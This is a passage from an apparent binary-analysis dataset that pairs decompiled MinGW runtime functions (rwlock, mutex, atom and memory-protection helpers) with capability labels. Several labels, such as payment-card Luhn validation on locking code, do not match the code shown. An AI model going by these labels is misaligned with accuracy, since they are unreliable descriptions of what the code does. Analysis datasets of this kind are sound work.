= 0x40;\n        do {\n            if ((uVar9 >> (uVar8 & 0x3f) & 1) != 0) {\n                *(iVar10 + (uVar12 - uVar8)) = 0x41;\n            }\n            uVar11 = uVar8 - 1;\n            uVar8 = uVar11;\n        } while (uVar11 != 0);\n        *(auStack184 + iVar6) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        *(auStack184 + iVar6) = 0x410b49;\n        uVar8 = fcn.00410980(uVar3, iVar10, uVar12, iVar4 + 0x10);\n        if (uVar8 == uVar9) {\n            *(auStack184 + iVar6) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar9, 0, 0x10);\n            *(auStack184 + iVar6) = 0x410bb1;\n            (*0x411320)(uVar9);\n        }\n        else {\n            *(auStack184 + iVar6) = 0x410b59;\n            sub.msvcrt.dll_free(uVar9);\n        }\n    }\n    else {\n        *(auStack184 + iVar6) = 0x410b94;\n        uVar8 = fcn.00410980(uVar3, iVar10, uVar12, iVar4 + 0x10);\n    }\n    *(auStack184 + iVar6) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar7);\n    *(auStack184 + iVar6) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    return uVar8;\n}\n",
        "token_count": 1565
    },
    "00411800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00411800(ulong *arg1)\n\n{\n    uint *arg1_00;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    iVar1 = 0x16;\n    if (arg1 != NULL) {\n        *arg1 = 0;\n        puVar2 = sub.msvcrt.dll_calloc(1);\n        iVar1 = 0xc;\n        if (puVar2 != NULL) {\n            arg1_00 = puVar2 + 6;\n            *puVar2 = 0xdeadb0ef;\n            puVar2[4] = 0;\n            puVar2[3] = 0;\n            puVar2[2] = 0;\n            iVar1 = fcn.004101e0(arg1_00, 0);\n            if (iVar1 == 0) {\n                iVar1 = fcn.004101e0(puVar2 + 8, 0);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.00412660(puVar2 + 10, 0);\n                    if (iVar1 == 0) {\n                        *puVar2 = 0xbab1f0ed;\n                        *arg1 = puVar2;\n                        return 0;\n                    }\n                    fcn.00410810(arg1_00);\n                    fcn.00410810(puVar2 + 8);\n                    sub.msvcrt.dll_free(puVar2);\n                    return iVar1;\n                }\n                fcn.00410810(arg1_00);\n            }\n            sub.msvcrt.dll_free(puVar2);\n            return iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 369
    },
    "004118f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004118f0(int64_t *arg1)\n\n{\n    uint uVar1;\n    \n    if (*0x434a50 == 0) {\n        *0x434a50 = fcn.00410a00(\"cond_locked_shmem_rwlock\", 0x10, 0x411340);\n    }\n    fcn.00410db0(*0x434a50);\n    if (*arg1 == -1) {\n        uVar1 = fcn.00411800(arg1);\n        if (*0x434a50 == 0) {\n            *0x434a50 = fcn.00410a00(\"cond_locked_shmem_rwlock\", 0x10, 0x411340);\n        }\n        fcn.00410d10(*0x434a50);\n    }\n    else {\n        if (*0x434a50 == 0) {\n            *0x434a50 = fcn.00410a00(\"cond_locked_shmem_rwlock\", 0x10, 0x411340);\n        }\n        fcn.00410d10(*0x434a50);\n        uVar1 = 0x16;\n    }\n    return uVar1;\n}\n",
        "token_count": 261
    },
    "00411bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00411bf0(int32_t **arg1)\n\n{\n    int32_t *arg1_00;\n    uchar *arg2;\n    ulong *puVar1;\n    int32_t *arg1_01;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    char *arg1_02;\n    uint32_t uVar11;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t auStack128 [2];\n    \n    fcn.0040eac0();\n    uVar10 = fcn.004119d0(arg1);\n    if (uVar10 != 0) {\n        return uVar10;\n    }\n    arg1_01 = *arg1;\n    arg1_00 = arg1_01 + 6;\n    uVar6 = fcn.00410710(arg1_00);\n    if (uVar6 == 0) {\n        LOCK();\n        arg1_01[3] = arg1_01[3] + 1;\n        if (arg1_01[3] == 0x7fffffff) {\n            uVar6 = fcn.00410710(arg1_01 + 8);\n            if (uVar6 == 0) {\n                arg1_01[3] = arg1_01[3] - arg1_01[4];\n                arg1_01[4] = 0;\n                uVar6 = fcn.004115c0(arg1_01, 0);\n            }\n            else {\n                fcn.00410100(arg1_00);\n            }\n        }\n        else {\n            uVar6 = fcn.00410100(arg1_00);\n        }\n    }\n    auStack128[0] = uVar6;\n    if (*0x434a58 == 0) {\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    }\n    fcn.00410db0(*0x434a58);\n    if ((**arg1 == -0x454e0f13) && (0 < (*arg1)[1])) {\n        (*arg1)[1] = (*arg1)[1] + -1;\n        if (*0x434a58 != 0) {\n            fcn.00410d10(*0x434a58);\n            return auStack128[0];\n        }\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n        fcn.00410d10(*0x434a58);\n        return auStack128[0];\n    }\n    iVar9 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf\n              (iVar9 + 0x60, \"Assertion failed: (%s), file %s, line %d\\n\", \n               \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_02 = \"rwl_global_shmem\";\n    auStack184[0] = 0x410a26;\n    uStack136 = arg1;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar9 = fcn.0040b810(arg1_02);\n    iVar9 = -iVar9;\n    arg2 = &stack0xffffffffffffff70 + iVar9;\n    *(&stack0xffffffffffffff70 + iVar9) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff78 + iVar9) = 0x64742d6d;\n    *(&stack0xffffffffffffff7c + iVar9) = 0x326d;\n    uVar6 = iVar4 + 0x50;\n    (&stack0xffffffffffffff7e)[iVar9] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar9) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff7f + iVar9, \"rwl_global_shmem\", iVar4);\n    puVar1 = &stack0xffffffffffffff80 + iVar4 + iVar9;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff70)[uVar6 + iVar9] = 0;\n    (&stack0xffffffffffffff70)[(iVar4 + 0xf) + iVar9] = 0;\n    *(&stack0xffffffffffffff48 + iVar9) = 0x410ace;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff70)[(iVar4 + 0xf) + iVar9] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar9) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar10 = (*pcVar2)();\n        return uVar10;\n    }\n    *(&stack0xffffffffffffff48 + iVar9) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff48 + iVar9) = 0x410b07;\n        uVar8 = sub.msvcrt.dll_malloc(0x10);\n        uVar10 = 0x40;\n        do {\n            if ((uVar8 >> (uVar10 & 0x3f) & 1) != 0) {\n                arg2[uVar6 - uVar10] = 0x41;\n            }\n            uVar11 = uVar10 - 1;\n            uVar10 = uVar11;\n        } while (uVar11 != 0);\n        *(&stack0xffffffffffffff48 + iVar9) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar10 = (*pcVar2)();\n            return uVar10;\n        }\n        *(&stack0xffffffffffffff48 + iVar9) = 0x410b49;\n        uVar10 = fcn.00410980(uVar3, arg2, uVar6, iVar4 + 0x10);\n        if (uVar10 == uVar8) {\n            *(&stack0xffffffffffffff48 + iVar9) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar8, 0, 0x10);\n            *(&stack0xffffffffffffff48 + iVar9) = 0x410bb1;\n            (*0x411320)(uVar8);\n        }\n        else {\n            *(&stack0xffffffffffffff48 + iVar9) = 0x410b59;\n            sub.msvcrt.dll_free(uVar8);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff48 + iVar9) = 0x410b94;\n        uVar10 = fcn.00410980(uVar3, arg2, uVar6, iVar4 + 0x10);\n    }\n    *(&stack0xffffffffffffff48 + iVar9) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar7);\n    *(&stack0xffffffffffffff48 + iVar9) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    return uVar10;\n}\n",
        "token_count": 1903
    },
    "00411f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411f40(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    int64_t *piVar4;\n    uint64_t arg2;\n    code *pcStack88;\n    int64_t iStack80;\n    ulong uStack72;\n    \n    fcn.0040eac0();\n    iVar1 = fcn.004119d0(arg1);\n    if (iVar1 != 0) {\n        return;\n    }\n    arg1_00 = *arg1;\n    uVar2 = fcn.00411560(arg1_00);\n    arg2 = uVar2;\n    if (uVar2 == 0) {\n        if (*(arg1_00 + 8) == 0) {\n            iVar1 = *(arg1_00 + 0xc);\n            if (0 < *(arg1_00 + 0x10)) {\n                iVar1 = iVar1 - *(arg1_00 + 0x10);\n                *(arg1_00 + 0x10) = 0;\n                *(arg1_00 + 0xc) = iVar1;\n            }\n            if (0 < iVar1) {\n                *(arg1_00 + 0x10) = -iVar1;\n                pcStack88 = 0x411600;\n                iStack80 = arg1_00;\n                puVar3 = fcn.0040e710();\n                uStack72 = *puVar3;\n                piVar4 = fcn.0040e710();\n                *piVar4 = &pcStack88;\n                do {\n                    uVar2 = fcn.00413010(arg1_00 + 0x28, arg1_00 + 0x20);\n                    if (uVar2 != 0) {\n                        puVar3 = fcn.0040e710();\n                        *puVar3 = uStack72;\n                        (*pcStack88)(iStack80);\n                        arg2 = uVar2;\n                        goto code_r0x00412045;\n                    }\n                } while (*(arg1_00 + 0x10) < 0);\n                puVar3 = fcn.0040e710();\n                *puVar3 = uStack72;\n                *(arg1_00 + 0xc) = 0;\n            }\n        }\n        LOCK();\n        *(arg1_00 + 8) = *(arg1_00 + 8) + 1;\n    }\ncode_r0x00412045:\n    fcn.00411620(arg1, arg2);\n    return;\n}\n",
        "token_count": 574
    },
    "00412250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00412250(ulong noname_0, ulong arg2)\n\n{\n    int64_t iStack24;\n    uint16_t uStack16;\n    \n    (*_sym.imp.msvcrt.dll__ftime)(&iStack24);\n    return uStack16 + iStack24 * 1000;\n}\n",
        "token_count": 71
    },
    "00412790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00412790(int64_t *arg1)\n\n{\n    uint uVar1;\n    \n    if (*0x434a70 == 0) {\n        *0x434a70 = fcn.00410a00(\"cond_locked_shmem_cond\", 0x10, 0x412320);\n    }\n    fcn.00410db0(*0x434a70);\n    uVar1 = 0x16;\n    if ((arg1 != NULL) && (uVar1 = 0,  *arg1 == -1)) {\n        uVar1 = fcn.00412660(arg1, 0);\n    }\n    if (*0x434a70 != 0) {\n        fcn.00410d10(*0x434a70);\n        return uVar1;\n    }\n    *0x434a70 = fcn.00410a00(\"cond_locked_shmem_cond\", 0x10, 0x412320);\n    fcn.00410d10(*0x434a70);\n    return uVar1;\n}\n",
        "token_count": 232
    },
    "00412b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00412b40(ulong arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t *in_stack_00000028;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg4);\n    LOCK();\n    *in_stack_00000028 = *in_stack_00000028 + -1;\n    pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n    iVar1 = *in_stack_00000028;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg4);\n    iVar4 = 0;\n    if (iVar1 < 0) {\n        iVar4 = fcn.00412860(arg1, arg2 & 0xffffffff, arg3 & 0xffffffff);\n        (*pcVar2)(arg4);\n        if (iVar4 != 0) {\n            LOCK();\n            *in_stack_00000028 = *in_stack_00000028 + 1;\n        }\n        (*pcVar3)(arg4);\n    }\n    return iVar4;\n}\n",
        "token_count": 276
    },
    "00414480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414480(ulong arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.004147e0(arg1, arg2);\n    if (cVar1 != '\\0') {\n        *arg4 = arg3;\n        arg4[2] = 0x10;\n        *(arg4 + 1) = 6;\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0040e9e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040e9e0(void)\n\n{\n    code **ppcVar1;\n    int32_t *piVar2;\n    \n    ppcVar1 = fcn.0040cd40();\n    *(ppcVar1 + 8) = *(ppcVar1 + 8) & 0xf3 | 4;\n    fcn.0040e9b0(1);\n    piVar2 = *0x434a00;\n    if (*0x434a00 == NULL) goto code_r0x0040ea40;\n    do {\n        piVar2 = *0x434a00;\n        LOCK();\n        **0x434a00 = **0x434a00 + -1;\n        for (ppcVar1 = ppcVar1[3]; ppcVar1 != NULL; ppcVar1 = ppcVar1[2]) {\n            (**ppcVar1)();\n        }\n        fcn.0040e9b0(0);\n        fcn.0040e7e0(0xdeadbeef);\ncode_r0x0040ea40:\n        *0x434a00 = fcn.00410a00(\"_pthread_cancelling_shmem\", CONCAT71(piVar2 >> 8, 4), 0);\n    } while( true );\n}\n",
        "token_count": 285
    },
    "00413c50": {
        "rules": [
            "contain loop",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\nuint64_t fcn.00413c50(void)\n\n{\n    int64_t arg2;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    char *arg1;\n    uint32_t uVar10;\n    ulong auStack128 [5];\n    ulong uStack88;\n    uint uStack80;\n    uint uStack76;\n    ulong uStack72;\n    \n    arg1 = \"__terminate_handler_sh\";\n    auStack128[0] = 0x40b676;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack128[0] = 0x40b68e;\n    iVar6 = fcn.0040b810(arg1);\n    iVar6 = -iVar6;\n    arg2 = &uStack88 + iVar6;\n    *(&uStack88 + iVar6) = 0x656d68732d636367;\n    *(&uStack80 + iVar6) = 0x64742d6d;\n    *(&uStack72 + iVar6 + -4) = 0x326d;\n    *(&uStack72 + iVar6 + -2) = 0x2d;\n    *(auStack128 + iVar6) = 0x40b6d6;\n    sub.msvcrt.dll_memcpy(&uStack72 + iVar6 + -1, \"__terminate_handler_sh\", iVar4);\n    puVar1 = &uStack72 + iVar4 + iVar6;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    *(&uStack88 + (iVar4 + 0x50) + iVar6) = 0;\n    *(&uStack88 + (iVar4 + 0xf) + iVar6) = 0;\n    *(auStack128 + iVar6) = 0x40b71e;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack88 + (iVar4 + 0xf) + iVar6) = 0x2d;\n    *(auStack128 + iVar6) = 0x40b734;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar8 = (*pcVar2)();\n        return uVar8;\n    }\n    *(auStack128 + iVar6) = 0x40b742;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(auStack128 + iVar6) = 0x40b753;\n        uVar9 = sub.msvcrt.dll_malloc(8);\n        uVar8 = 0x40;\n        do {\n            if ((uVar9 >> (uVar8 & 0x3f) & 1) != 0) {\n                *(arg2 + ((iVar4 + 0x50) - uVar8)) = 0x41;\n            }\n            uVar10 = uVar8 - 1;\n            uVar8 = uVar10;\n        } while (uVar10 != 0);\n        uStack76 = iVar4 + 0x10;\n        *(auStack128 + iVar6) = 0x40b787;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        uVar8 = uStack76;\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        *(auStack128 + iVar6) = 0x40b79f;\n        uVar8 = fcn.0040b5d0(uVar3, arg2, iVar4 + 0x51, uVar8);\n        if (uVar8 == uVar9) {\n            *(auStack128 + iVar6) = 0x40b7fd;\n            sub.msvcrt.dll_memset(uVar9, 0, 8);\n            *(auStack128 + iVar6) = 0x40b808;\n            (*0x4152f0)(uVar9);\n        }\n        else {\n            *(auStack128 + iVar6) = 0x40b7af;\n            sub.msvcrt.dll_free(uVar9);\n        }\n    }\n    else {\n        *(auStack128 + iVar6) = 0x40b7eb;\n        uVar8 = fcn.0040b5d0(uVar3, arg2, iVar4 + 0x51, iVar4 + 0x10);\n    }\n    *(auStack128 + iVar6) = 0x40b7b8;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar7);\n    *(auStack128 + iVar6) = 0x40b7c1;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    return uVar8;\n}\n",
        "token_count": 1271
    },
    "00413c70": {
        "rules": [
            "contain loop",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\nuint64_t fcn.00413c70(void)\n\n{\n    int64_t arg2;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    char *arg1;\n    uint32_t uVar10;\n    ulong auStack128 [5];\n    ulong uStack88;\n    uint uStack80;\n    uint uStack76;\n    ulong uStack72;\n    \n    arg1 = \"__unexpected_handler_sh\";\n    auStack128[0] = 0x40b676;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack128[0] = 0x40b68e;\n    iVar6 = fcn.0040b810(arg1);\n    iVar6 = -iVar6;\n    arg2 = &uStack88 + iVar6;\n    *(&uStack88 + iVar6) = 0x656d68732d636367;\n    *(&uStack80 + iVar6) = 0x64742d6d;\n    *(&uStack72 + iVar6 + -4) = 0x326d;\n    *(&uStack72 + iVar6 + -2) = 0x2d;\n    *(auStack128 + iVar6) = 0x40b6d6;\n    sub.msvcrt.dll_memcpy(&uStack72 + iVar6 + -1, \"__unexpected_handler_sh\", iVar4);\n    puVar1 = &uStack72 + iVar4 + iVar6;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    *(&uStack88 + (iVar4 + 0x50) + iVar6) = 0;\n    *(&uStack88 + (iVar4 + 0xf) + iVar6) = 0;\n    *(auStack128 + iVar6) = 0x40b71e;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack88 + (iVar4 + 0xf) + iVar6) = 0x2d;\n    *(auStack128 + iVar6) = 0x40b734;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar8 = (*pcVar2)();\n        return uVar8;\n    }\n    *(auStack128 + iVar6) = 0x40b742;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(auStack128 + iVar6) = 0x40b753;\n        uVar9 = sub.msvcrt.dll_malloc(8);\n        uVar8 = 0x40;\n        do {\n            if ((uVar9 >> (uVar8 & 0x3f) & 1) != 0) {\n                *(arg2 + ((iVar4 + 0x50) - uVar8)) = 0x41;\n            }\n            uVar10 = uVar8 - 1;\n            uVar8 = uVar10;\n        } while (uVar10 != 0);\n        uStack76 = iVar4 + 0x10;\n        *(auStack128 + iVar6) = 0x40b787;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        uVar8 = uStack76;\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        *(auStack128 + iVar6) = 0x40b79f;\n        uVar8 = fcn.0040b5d0(uVar3, arg2, iVar4 + 0x51, uVar8);\n        if (uVar8 == uVar9) {\n            *(auStack128 + iVar6) = 0x40b7fd;\n            sub.msvcrt.dll_memset(uVar9, 0, 8);\n            *(auStack128 + iVar6) = 0x40b808;\n            (*0x415300)(uVar9);\n        }\n        else {\n            *(auStack128 + iVar6) = 0x40b7af;\n            sub.msvcrt.dll_free(uVar9);\n        }\n    }\n    else {\n        *(auStack128 + iVar6) = 0x40b7eb;\n        uVar8 = fcn.0040b5d0(uVar3, arg2, iVar4 + 0x51, iVar4 + 0x10);\n    }\n    *(auStack128 + iVar6) = 0x40b7b8;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar7);\n    *(auStack128 + iVar6) = 0x40b7c1;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    return uVar8;\n}\n",
        "token_count": 1269
    },
    "00414880": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414880(void)\n\n{\n    if (*0x42c330 == NULL) goto code_r0x00414898;\n    do {\n        fcn.00413b80(**0x42c330);\ncode_r0x00414898:\n        *0x42c330 = fcn.00413c70();\n    } while( true );\n}\n",
        "token_count": 80
    },
    "00414970": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414970(void)\n\n{\n    if (*0x42c320 == NULL) goto code_r0x00414988;\n    do {\n        fcn.00413b40(**0x42c320);\ncode_r0x00414988:\n        *0x42c320 = fcn.00413c50();\n    } while( true );\n}\n",
        "token_count": 80
    },
    "0040a1a0": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0040a1a0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    code *pcVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    int64_t iVar15;\n    int32_t *piVar16;\n    int32_t iVar17;\n    ulong *puVar18;\n    ulong *arg3_00;\n    uint64_t *arg3_01;\n    uchar *arg4_00;\n    int64_t unaff_R12;\n    ulong *unaff_R13;\n    uchar *unaff_R14;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack384 [5];\n    uchar auStack344 [12];\n    uchar auStack332 [4];\n    uchar *apuStack328 [3];\n    ulong uStack304;\n    code *pcStack280;\n    uchar *puStack272;\n    ulong uStack264;\n    int64_t iStack256;\n    ulong *puStack248;\n    uchar *puStack240;\n    ulong *puStack232;\n    uint uStack180;\n    ulong auStack176 [3];\n    ulong uStack152;\n    int32_t iStack140;\n    ulong uStack128;\n    ulong *puStack120;\n    \n    puStack120 = &uStackX16;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    iVar5 = sub.msvcrt.dll___iob_func();\n    arg4_00 = iVar5 + 0x60;\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    iVar5 = sub.msvcrt.dll___iob_func();\n    puStack272 = iVar5 + 0x60;\n    uStack264 = arg1;\n    puVar18 = puStack120;\n    sub.msvcrt.dll_vfprintf();\n    sub.msvcrt.dll_abort();\n    arg3_00 = puVar18;\n    uStack128 = arg1;\n    if (*0x434354 < 1) goto code_r0x0040a3f5;\n    pcStack280 = NULL;\n    iVar5 = *0x434358;\n    do {\n        arg4_00 = *(iVar5 + 8);\n        if ((arg4_00 <= puStack272) &&\n           (arg4_00 = arg4_00 + *(*(iVar5 + 0x10) + 8),  pcVar12 = _sym.imp.KERNEL32.dll_VirtualQuery, \n           puStack272 < arg4_00)) goto code_r0x0040a2eb;\n        uVar10 = pcStack280 + 1;\n        pcStack280 = uVar10;\n        iVar5 = iVar5 + 0x18;\n    } while (uVar10 != *0x434354);\n    while( true ) {\n        puStack232 = 0x40a26f;\n        unaff_R12 = fcn.0040ad70(puStack272);\n        if (unaff_R12 == 0) break;\n        unaff_R13 = auStack176;\n        unaff_R14 = pcStack280 * 0x18;\n        puVar11 = unaff_R14 + *0x434358;\n        *(puVar11 + 4) = unaff_R12;\n        *puVar11 = 0;\n        puStack232 = 0x40a2a4;\n        iVar5 = fcn.0040aeb0();\n        *(puVar11 + 2) = iVar5 + *(unaff_R12 + 0xc);\n        pcStack280 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        puStack232 = 0x40a2ce;\n        iVar5 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(*(unaff_R14 + *0x434358 + 8), unaff_R13, 0x30);\n        if (iVar5 == 0) {\n            arg3_00 = *(unaff_R14 + *0x434358 + 8);\n            puStack232 = 0x40a419;\n            fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", *(unaff_R12 + 8), arg3_00, arg4_00);\n            break;\n        }\n        if ((iStack140 == 4) || (iStack140 == 0x40)) {\ncode_r0x0040a2e4:\n            *0x434354 = *0x434354 + 1;\n            pcVar12 = pcStack280;\ncode_r0x0040a2eb:\n            unaff_R13 = auStack176;\n            puStack232 = 0x40a2f9;\n            iVar5 = (*pcVar12)(puStack272, unaff_R13, 0x30);\n            pcVar4 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            pcStack280 = pcVar12;\n            if (iVar5 != 0) {\n                if ((iStack140 != 4) && (iStack140 != 0x40)) {\n                    puStack232 = 0x40a366;\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)(auStack176[0], uStack152, 0x40, &uStack180);\n                    puStack232 = 0x40a374;\n                    sub.msvcrt.dll_memcpy(puStack272, uStack264, puVar18);\n                    if ((iStack140 != 0x40) && (iStack140 != 4)) {\n                        puStack232 = 0x40a396;\n                        (*pcVar4)(auStack176[0], uStack152, uStack180, &uStack180);\n                    }\n                    return;\n                }\n    // WARNING: Could not recover jumptable at 0x0040b8a0. Too many branches\n    // WARNING: Treating indirect jump as call\n                (*_sym.imp.msvcrt.dll_memcpy)(puStack272, uStack264, puVar18);\n                return;\n            }\n            goto code_r0x0040a428;\n        }\n        unaff_R14 = unaff_R14 + *0x434358;\n        arg3_00 = 0x40;\n        puStack232 = 0x40a3d9;\n        arg4_00 = unaff_R14;\n        iVar17 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(auStack176[0]);\n        if (iVar17 != 0) goto code_r0x0040a2e4;\n        puStack232 = 0x40a3e7;\n        uVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack232 = 0x40a3f5;\n        fcn.0040a1a0(\"  VirtualProtect failed with code 0x%x\", uVar10, arg3_00, arg4_00);\ncode_r0x0040a3f5:\n        pcStack280 = NULL;\n    }\n    puStack232 = 0x40a428;\n    fcn.0040a1a0(\"Address %p has no image-section\", puStack272, arg3_00, arg4_00);\ncode_r0x0040a428:\n    pcVar8 = \"  VirtualQuery failed for %d bytes at address %p\";\n    puStack232 = 0x40a43c;\n    puVar7 = 